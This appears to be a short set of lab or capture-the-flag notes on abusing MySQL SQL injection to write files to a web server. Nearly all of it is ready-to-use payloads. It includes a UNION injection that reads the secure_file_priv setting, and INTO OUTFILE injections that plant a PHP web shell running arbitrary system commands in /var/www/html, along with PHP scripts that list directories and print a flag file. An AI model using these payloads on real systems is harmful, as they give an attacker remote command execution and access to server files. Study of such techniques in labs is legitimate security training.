# Writing files

## User privileges

SHOW VARIABLES LIKE 'secure_file_priv';
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- 

If empty, we can read/write files to any location.

SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt'

## Writing Files through SQL Injection

cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- 

cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -


cn' union select "",'<?php $directoryPath = "/var/www/"; $dirHandle = opendir($directoryPath); if (!$dirHandle) { echo "Error: Failed to open the directory."; return; } echo "<h2>Files in Directory: $directory</h2>"; echo "<ul>"; while (($file = readdir($dirHandle)) !== false) { if ($file != \'.\' && $file != \'..\') { echo "<li>$file</li>"; } } closedir($dirHandle); ?>', "", "" into outfile '/var/www/html/shell3.php'-- 


cn' union select "",'<?php $filePath = \'/var/www/flag.txt\'; if (file_exists($filePath)) { $content = file_get_contents($filePath); echo nl2br(htmlspecialchars($content)); } else { echo "The file does not exist."; } ?>
', "", "" into outfile '/var/www/html/shell4.php'-- 